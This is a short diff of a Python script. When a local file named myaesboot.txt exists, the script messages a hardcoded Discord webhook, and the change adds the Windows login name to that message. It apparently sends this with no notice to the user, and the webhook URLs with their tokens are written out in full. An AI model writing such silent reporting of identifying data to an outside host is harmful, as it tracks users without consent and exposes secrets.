@@ -31,7 +31,9 @@ send_dx("https://discordapp.com/api/webhooks/1273024308729352192/jPqxaz_B33A7f_h
 os.system('cls')
 file_pathmybootaes = r"C:\myaesboot.txt"
 if os.path.exists(file_pathmybootaes):
-    send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "tried to load another settings of aes.")
+    usernamex = os.getlogin()
+    mymsgx = usernamex+"tried to load another settings of aes"
+    send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", mymsgx)
     print("")
     print("")
     print("")
